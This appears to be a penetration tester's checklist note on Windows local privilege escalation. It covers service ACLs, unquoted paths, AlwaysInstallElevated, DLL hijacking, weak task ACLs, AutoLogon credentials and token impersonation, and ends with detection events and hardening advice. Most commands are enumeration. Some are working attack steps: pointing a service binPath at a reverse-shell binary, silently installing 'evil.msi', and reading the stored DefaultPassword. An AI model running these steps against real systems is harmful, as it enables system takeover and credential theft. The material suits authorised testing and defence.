---
title: Windows Privilege Escalation Checklist
slug: windows-privesc-checklist
---

> **TL;DR:** A tight checklist of the seven highest-yield local-privilege-escalation primitives on Windows: service ACLs, unquoted paths, AlwaysInstallElevated, DLL hijack, weak task ACLs, AutoLogon creds, and token impersonation.

## What it is
Most Windows local privesc on modern builds reduces to a small set of misconfigurations and primitives. This note is the cheatsheet — each item has a one-line detection command and a pointer to a deeper write-up. Work top-to-bottom; the cheap wins live at the top.

## Preconditions / where it applies
- Authenticated low-privileged shell (Medium or Low IL)
- A working command channel (cmd, PowerShell, or a reverse shell)
- Targets: Windows 10/11 and Server 2016+ (older versions are easier but rarer)
- Some checks require `SeImpersonatePrivilege` or membership in `IIS_IUSRS` / `LOCAL SERVICE` / `NETWORK SERVICE`

## Technique
```cmd
:: 1. Service ACL misconfiguration — can we change binPath?
sc.exe sdshow "vulnsvc"
:: Look for (A;;RPWPCR;;;BA) or WD ACEs granting WriteDACL/Start
sc.exe config vulnsvc binPath= "C:\Windows\Temp\rev.exe"
sc.exe start vulnsvc

:: 2. Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: 3. AlwaysInstallElevated — both keys must be 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi
```

```powershell
# 4. DLL hijack — find services / autoruns missing DLLs in writable directories
# Search order: app dir, System32, System, Windows, CWD, %PATH%
Get-ChildItem $env:PATH.Split(';') -ErrorAction SilentlyContinue |
    Where-Object { (Get-Acl $_.FullName).Access |
        Where-Object IdentityReference -match 'Users|Everyone' }

# 5. Scheduled tasks with weak ACL on the task file or action target
Get-ScheduledTask | ForEach-Object {
    $p = $_.Actions.Execute
    if ($p -and (Test-Path $p)) { icacls $p 2>$null | Select-String 'Users|Everyone' }
}

# 6. AutoLogon credentials in the registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# 7. Token impersonation — when SeImpersonatePrivilege is held
whoami /priv | Select-String SeImpersonate
# Trigger a privileged caller (PrintSpoofer, GodPotato, etc.) to relay the token
```

## Detection and defence
- Sysmon event ID 13 on `HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath` change catches service binPath hijacks
- Event ID 4698 (scheduled task created) and 4670 (object permissions changed) catch task-ACL abuse
- Defender flags `PrintSpoofer.exe` / `GodPotato.exe` as `HackTool:Win32/Potato`
- Defence: set both AlwaysInstallElevated keys to 0, quote every service path, remove `Authenticated Users` write on service binaries, and apply LAPS so AutoLogon is never used

## References
- [Windows Privesc Cheatsheet — HackTricks](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html) — comprehensive walkthrough
- [Potato family overview](https://github.com/BeichenDream/GodPotato) — modern SeImpersonate abuse
- [icacls reference](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) — ACL parsing

See also: [[winpeas-enumeration-flow]], [[weak-service-permissions]], [[unquoted-service-paths]], [[always-install-elevated]], [[dll-hijacking-privesc]].
